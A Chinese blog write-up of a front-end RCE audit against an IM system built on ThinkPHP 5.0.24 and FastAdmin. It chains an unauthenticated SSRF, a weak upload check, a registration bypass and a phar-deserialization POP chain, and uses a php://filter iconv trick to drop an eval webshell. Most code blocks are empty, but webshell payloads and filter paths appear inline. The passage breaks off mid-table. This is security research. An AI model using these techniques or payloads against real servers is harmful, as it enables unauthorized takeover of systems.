#  一次案件前台RCE审计  
原创 秋风
                    秋风  秋风的安全之路   2026-04-28 01:01  
  
# 一次案件前台RCE审计  
> 目标：某涉案IM系统（ThinkPHP 5.0.24 / FastAdmin 2.5.1）  
成果：前台无条件RCE，获取webshell  
> 作者：秋风  
  
### 利用链总览  
```
```  
## 0x01 目标概况  
  
拿到源码先看目录结构。根目录下有   
thinkphp/  
 目录、  
application/  
 目录和   
public/index.php  
 入口文件，是标准的 ThinkPHP 5 + FastAdmin 结构。  
  
翻了下   
thinkphp/base.php  
，版本写死的   
5.0.24  
。后台控制器的 namespace 是   
app\adim888\controller  
，后台路径   
/adim888/  
，不是默认的   
/admin/  
。  
  
服务器环境是通过后面的SSRF读配置文件一步步摸清的：  
  
<table><thead><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-style: solid solid none;border-color: rgb(223, 226, 229) rgb(223, 226, 229) currentcolor;border-image: none;margin: 0px;"><span cid="n4448" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 181.984375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">项目</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-style: solid solid none;border-color: rgb(223, 226, 229) rgb(223, 226, 229) currentcolor;border-image: none;margin: 0px;"><span cid="n4449" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 563.03125px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">值</span></span></span></th></tr></thead><tbody><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4451" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 181.984375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">框架</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4452" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 563.03125px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">ThinkPHP 5.0.24 + FastAdmin 2.5.1</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4454" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 181.984375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">服务器</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4455" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 563.03125px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">Linux im163 6.1.56 (Amazon Linux 2023) x86_64</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4457" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 181.984375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">PHP</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4458" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 563.03125px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">7.x，short_open_tag=On</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4460" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 181.984375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">open_basedir</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4461" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 563.03125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">/www/wwwroot/admin/:/tmp/</span></code></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4463" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 181.984375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">disable_functions</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4464" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 563.03125px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">system, exec, shell_exec, passthru, popen, proc_open 等</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4466" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 181.984375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">Web根目录</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4467" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 563.03125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">/www/wwwroot/admin/public/</span></code></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4469" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 181.984375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">面板</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4470" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 563.03125px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">宝塔Linux</span></span></span></td></tr></tbody></table>## 0x02 攻击面梳理  
  
前台能打的只有   
application/api/controller/  
 下面这些控制器。后台   
/adim888/  
 需要管理员session，先不管。  
  
逐个翻前台控制器，找的是这几种模式：  
- file_get_contents($可控)  
 —— SSRF  
  
- 裸SQL拼接，或者   
->where($可控字符串)  
 —— SQLi  
  
- 文件操作（上传/删除/包含）  
  
- 任何可能触发反序列化的sink（  
unserialize  
、  
phar://  
）  
  
## 0x03 漏洞一：SSRF —— /api/image/image  
  
翻到   
application/api/controller/Image.php  
，整个控制器就一个方法，写得非常直接：  
```
```  
  
$noNeedLogin = '*'  
 意味着这个接口完全不需要认证。  
input('url')  
 直接拿用户传入的url参数，丢给   
file_get_contents()  
，没有任何过滤。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ogrJiczzwv0DQhIwMgRMYvvPjZy0bF6QRJYiaxUhXDdP4TEl88eGicMbgb09zjEl8sicMjEfz075qZEKRsp6Vw6CCFia9VBHRJ9eED159HnZCyZw/640?wx_fmt=png&from=appmsg "")  
  
  
这个SSRF能做的事情很多：  
  
**读本地文件：**  
```
```  
  
受 open_basedir 限制，只能读   
/www/wwwroot/admin/  
 和   
/tmp/  
 两个目录。不过对审计来说够用了——整个项目源码和ThinkPHP框架源码都在   
/www/wwwroot/admin/  
 下面。  
  
但是仅仅是读本地文件+env打链子在无法远程mysql连接的情况下是不行的  
  
但是 要注意  
file_get_contents()  
 支持   
phar://  
 协议  
  
**触发phar反序列化：**  
```
```  
  
这就是后面RCE的触发点。  
## 0x04 漏洞二：上传校验不足 —— /api/common/upload  
  
application/api/controller/Common.php  
 的   
upload()  
 方法：  
```
```  
  
校验逻辑只看后缀名是不是在白名单里。  
jpg  
 在白名单中，后缀校验通过。上传后存到   
/uploads/YYYYMMDD/{filemd5}.jpg  
，路径完全可预测。  
  
关键问题：  
**只校验后缀，不检查文件内容**  
。一个PHAR文件，只要后缀是   
.jpg  
，就能直接传上去。后面会利用这一点上传 PHAR-JPEG polyglot。  
## 0x05 漏洞三：注册绕过 —— os=pc  
  
看   
User.php  
 的   
register()  
 方法（line 809），注册流程中会根据   
os  
 参数判断客户端类型：  
```
```  
  
当   
$client == "pc"  
 时走PC端流程，不需要手机验证码。直接   
POST /api/user/register  
 带上   
os=pc  
 就能注册账号，用于后续获取上传接口的认证token。  
## 0x06 ThinkPHP 5.0.24 POP链分析  
  
上面找到了SSRF（触发点）、上传（payload投递），下一步就是构造PHAR里的反序列化payload。ThinkPHP 5.0.24有一条经典的POP链，终点是往磁盘写PHP文件。  
### 链的入口：Windows::__destruct  
  
thinkphp/library/think/process/pipes/Windows.php  
：  
```
```  
  
$this->files  
 可控。当   
$filename  
 是一个对象时，  
file_exists()  
 会隐式调用   
__toString()  
。把   
$this->files  
 设为   
[Pivot对象]  
 就能跳到下一步。  
### Pivot::__toString → toArray  
  
think\Model  
（Pivot的父类）的   
__toString()  
 最终调用   
toArray()  
。  
toArray()  
 里面有一段处理   
$this->append  
 的逻辑（Model.php line 887-923）：  
```
```  
  
设   
$this->append = ['getError']  
，Pivot有   
getError()  
 方法（返回   
$this->error  
），  
$this->error  
 设为一个   
HasOne  
 关系对象。  
  
getRelationData()  
 这里有个关键判断（Model.php line 639-651）：  
```
```  
  
控制   
$this->parent  
 为   
Output  
 对象，  
HasOne::isSelfRelation()  
 返回 false，类名匹配条件满足后，  
$value  
 就是这个   
Output  
 对象。  
  
然后遍历   
bindAttr  
，调用   
$value->getAttr($attr)  
——但   
Output  
 没有   
getAttr  
 方法，触发   
__call  
。  
### Output::__call → Memcached::write  
  
think\console\Output  
 的   
__call  
 实现（Output.php line 209-220）：  
```
```  
  
$this->styles  
 设为   
['getAttr']  
，匹配成功后调用   
block('getAttr', 'no')  
：  
```
```  
  
输出   
<getAttr>no</getAttr>  
，经过   
writeln()  
 →   
write()  
 →   
$this->handle->write()  
。  
  
$this->handle  
 设为   
Memcached  
 对象（  
think\session\driver\Memcached  
，不是PHP的ext-memcached扩展）：  
```
```  
  
$this->handler  
 设为   
File  
 缓存驱动对象，  
$sessID  
 就是那个   
<getAttr>no</getAttr>  
 字符串。  
### File::set —— 终点：写文件  
  
think\cache\driver\File  
 的   
set()  
 方法（File.php line 141-167）：  
```
```  
  
$this->options['path']  
 完全可控。  
set()  
 干了两件事：  
1. **写主缓存文件**  
：文件名 =   
path + md5($name) + '.php'  
，内容 =   
<?php exit();?>  
 前缀 +   
serialize(true)  
 即   
b:1;  
  
1. **调用 setTagItem($filename)**  
：把主缓存文件的完整路径作为值，写到tag文件里  
  
setTagItem()  
 在父类   
Driver  
 中（Driver.php line 188-202）：  
```
```  
  
tag文件的内容 =   
<?php exit();?>  
 前缀 +   
serialize(主缓存文件路径)  
。  
### 问题来了：exit()  
  
不管是主缓存文件还是tag文件，内容开头都有   
<?php\n//000000000000\n exit();?>\n  
。直接HTTP访问这些文件会执行到   
exit()  
 就结束了，后面的 webshell 代码永远跑不到。  
  
所以关键在于：  
**$this->options['path'] 可以设为 php://filter/write=XXX/resource=... 的形式**  
，利用PHP流过滤器在写入时对内容做变换，把   
exit()  
 搞掉。  
## 0x07 绕 exit()  
### 第一次：string.rot13（失败）  
  
思路：ROT13把   
<?php exit();?>  
 变成   
<?cuc rkvg();?>  
，正常情况下不被PHP执行。  
```
```  
  
写入后文件内容变成：  
```
```  
  
**但是服务器 short_open_tag=On。**  
  
<?cuc  
 被PHP解析为短开标签   
<? cuc  
，然后   
rkvg()  
 是个未定义函数，直接 Fatal Error。webshell 代码在后面根本跑不到。  
  
ROT13方案在   
short_open_tag=Off  
 的环境下可行，但这台服务器开了短标签，直接废了。  
### 第二次：strip_tags + base64-decode（失败）  
  
经典的两级过滤器方案：  
```
```  
  
原理：  
1. string.strip_tags  
 把   
<?php ... ?>  
 标签整个删掉，包括   
exit()  
  
1. convert.base64-decode  
 把剩余内容做base64解码，提取出预埋的webshell  
  
构造的 webshell 是   
<?php eval($_POST[x]);    
（24字节，24%3=0，base64不带padding）。base64编码后   
PD9waHAgZXZhbCgkX1BPU1RbeF0pOyAg  
，不含   
+  
 和   
=  
。  
  
payload嵌入到path的   
resource=  
 后面，写入时base64解码还原出webshell。  
  
**测试结果：主缓存文件正常，tag文件为空。**  
  
主缓存文件的值是   
serialize(true)  
 =   
b:1;  
，不含   
=  
，base64解码正常，写入后HTTP 200，返回1个字节   
o  
（base64残留解码结果），符合预期。  
  
但tag文件的值是主缓存文件的完整路径，类似：  
```
```  
  
路径里包含   
write=  
 和   
resource=  
 两个等号。  
convert.base64-decode  
 流过滤器是逐块处理的，遇到   
=  
 会当作base64 padding，导致后续数据解码错位，最终输出为空。  
  
在本地PHP 8.5和远程PHP 7上都验证了这个行为。  
**base64方案在tag文件这一步彻底失败。**  
### 第三次：convert.iconv.UCS-2LE.UCS-2BE（成功）  
  
换一个完全不同的思路。UCS-2是一种2字节定长编码，  
UCS-2LE  
 和   
UCS-2BE  
 之间转换就是把每2个字节互换位置。  
```
```  
  
原理很简单：  
```
```  
  
?<  
 不是PHP开标签（需要   
<?  
），所以   
exit()  
 这行被搅碎了，PHP不会执行。  
  
然后在路径中嵌入"预编码"的webshell——就是把目标webshell做一次字节交换：  
```
```  
  
写入时经过 iconv 字节交换，预编码的shell被还原成正确的PHP代码。  
  
**完整的写入文件内容示意：**  
```
```  
  
PHP解析时，前面的乱码不是   
<?  
 开头，被当作普通文本忽略。碰到   
<?php eval(...)  
 时进入PHP模式。  
die()  
 确保执行完 eval 后立刻结束，后面的乱码不会被解析。最后的   
?>  
 关闭PHP块，再后面的内容当HTML处理。  
### 关于 die() 和 ?> 的必要性  
  
第一次尝试 iconv 时，shell 写的是   
<?php eval($_POST[x]);die();  
（没有   
?>  
）。结果PHP解析器把shell后面的乱码字节也当PHP代码去解析，触发了 Parse Error，整个文件不可执行。  
  
加上   
?>  
 关闭标签后：  
- <?php eval($_POST[x]);die();?>  
 —— PHP块正确关闭  
  
- 后续乱码被当作HTML文本，不影响PHP执行  
  
- die()  
 阻止PHP输出乱码HTML  
  
### 字节对齐  
  
UCS-2要求处理的数据长度是偶数。写入的总内容包括：  
```
```  
  
预编码shell从第124字节开始，偏移为偶数，交换后能正确还原。总内容192字节，也是偶数。  
  
如果不加那个   
_  
 padding，总长度是奇数，最后一个字节没有配对，整个iconv转换就会出错。  
## 0x08 PHAR-JPEG Polyglot  
  
上传接口只接受图片后缀，而且上传后会调用   
getimagesize()  
 校验。所以PHAR文件需要同时是合法的JPEG。  
  
做法是用GD库生成一个1x1的JPEG，取其二进制内容（去掉末尾2字节EOI标记），再拼接上PHAR的   
__HALT_COMPILER()  
 标记作为stub：  
```
```  
  
生成的文件：  
- getimagesize()  
 识别为 1x1 image/jpeg（JPEG头完整）  
  
- PHP PHAR引擎能正确解析（  
__HALT_COMPILER()  
 标记存在）  
  
- 后缀   
.jpg  
 通过上传白名单  
  
## 0x09 open_basedir的影响  
  
服务器配置了   
open_basedir = /www/wwwroot/admin/:/tmp/  
。这个限制对攻击链的每个环节影响如下：  
  
**SSRF读文件：**  
  
file_get_contents('file:///etc/passwd')  
 会被拦。但   
/www/wwwroot/admin/  
 正好包含了整个项目目录，所有源码和框架文件都能读。  
/tmp/  
 可以用来读临时文件。对审计来说完全够用。  
  
**PHAR写文件：**  
  
file_put_contents()  
 写文件受 open_basedir 限制。但 webroot   
/www/wwwroot/admin/public/  
 就在   
/www/wwwroot/admin/  
 的子目录下，在允许范围内。如果 webroot 不在 open_basedir 列表里，这条链就断了。  
  
**webshell执行：**  
 shell落地后，  
eval()  
 内能操作的文件也局限在这两个目录。要读   
/etc/passwd  
 之类的需要先绕 open_basedir（chdir+ini_set技巧或者glob://），但这不影响RCE本身。  
  
**结论：open_basedir没有挡住这条攻击链。**  
 因为webroot恰好在允许列表内。如果管理员把 open_basedir 设成   
/www/wwwroot/admin/runtime/:/tmp/  
 之类不包含   
public/  
 的路径，POP链就写不进webroot了——当然那样网站自己也跑不了。  
## 0x0A SSRF的复合利用  
  
这次审计中，SSRF不只是用来触发PHAR的。整个过程中用了好几次：  
  
**1. 读源码辅助审计**  
  
通过   
file://  
 协议把服务端源码拉下来分析。open_basedir 内的文件都能读：  
```
```  
  
这样拿到了   
File::set()  
 的源码，确认了 exit 前缀的格式和   
setTagItem()  
 的行为。  
  
**2. 探测服务端配置**  
```
```  
  
发现   
.user.ini  
 存在且被   
chattr +i  
 保护（不可修改），排除了通过   
auto_prepend_file  
 注入webshell的路径。  
  
**3. 触发PHAR反序列化**  
```
```  
  
file_get_contents('phar://...')  
 解析PHAR文件，自动反序列化metadata中的对象，触发   
__destruct  
，启动POP链。  
  
**4. 验证文件写入**  
```
```  
  
通过   
file://  
 读取刚才写入的shell文件，确认文件是否落地、内容是否正确。  
## 0x0B 完整利用流程  
### Step 1：注册账号  
```
```  
  
os=pc  
 走PC端流程，跳过手机验证码。拿到token用于后续请求认证。  
### Step 2：生成PHAR-JPEG  
  
用PHP脚本生成。POP链参数：  
```
```  
  
path  
 分解：  
- php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=  
 —— 流过滤器声明  
  
- /www/wwwroot/admin/public/  
 —— webroot  
  
- _  
 —— 对齐padding  
  
- ?<hp pvela$(P_SO[T]x;)id(e;)>?  
 —— 预编码的webshell  
  
### Step 3：上传  
```
```  
### Step 4：SSRF触发  
```
```  
  
返回HTTP 500是正常的——POP链执行过程中抛了异常，但文件已经写入磁盘了。  
### Step 5：访问webshell  
  
文件名计算：  
- tag名   
xxx  
 →   
md5('xxx')  
 =   
b165eb...  
  
- tag key =   
tag_  
 +   
md5('xxx')  
 =   
tag_b165eb...  
  
- tag hash =   
md5('tag_b165eb...')  
 =   
12ac95f1498ce51d2d96a249c09c1998  
  
shell在磁盘上的路径：  
```
```  
  
HTTP访问（特殊字符URL编码）：  
```
```  
  
返回：  
```
```  
  
RCE成功。  
## 0x0C Shell信息  
```
```  
  
注意   
system()  
 /   
exec()  
 等被   
disable_functions  
 禁了，需要另外绕过（LD_PRELOAD / FFI / iconv trick 等），不在本文范围内。  
## 0x0D 踩坑记录  
  
<table><thead><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-style: solid solid none;border-color: rgb(223, 226, 229) rgb(223, 226, 229) currentcolor;border-image: none;margin: 0px;"><span cid="n4673" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 132.484375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">问题</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-style: solid solid none;border-color: rgb(223, 226, 229) rgb(223, 226, 229) currentcolor;border-image: none;margin: 0px;"><span cid="n4674" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 171.796875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">现象</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-style: solid solid none;border-color: rgb(223, 226, 229) rgb(223, 226, 229) currentcolor;border-image: none;margin: 0px;"><span cid="n4675" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 238.921875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">原因</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-style: solid solid none;border-color: rgb(223, 226, 229) rgb(223, 226, 229) currentcolor;border-image: none;margin: 0px;"><span cid="n4676" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 147.84375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">解决</span></span></span></th></tr></thead><tbody><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4678" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 132.484375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">ROT13写shell无法执行</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4679" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 171.796875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">访问shell返回500 Fatal Error</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4680" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 238.921875px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">short_open_tag=On</span></code></span><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">，</span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">&lt;?cuc</span></code></span><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""> 被当短标签解析</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4681" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 147.84375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">放弃ROT13</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4683" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 132.484375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">base64解码tag文件为空</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4684" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 171.796875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">主文件正常(1字节)，tag文件0字节</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4685" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 238.921875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">php://filter路径中的 </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">=</span></code></span><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""> 号干扰base64流解码</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4686" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 147.84375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">放弃base64</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4688" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 132.484375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">iconv写shell后Parse Error</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4689" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 171.796875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">访问shell返回500</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4690" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 238.921875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">shell没关 </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">?&gt;</span></code></span><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">，后面乱码被当PHP解析</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4691" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 147.84375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">加 </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">?&gt;</span></code></span><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""> 关闭标签 + </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">die()</span></code></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4693" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 132.484375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">UCS-2字节对齐错误</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4694" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 171.796875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">文件内容乱码</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4695" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 238.921875px;min-height: 10px;"><span md-inline="plain" 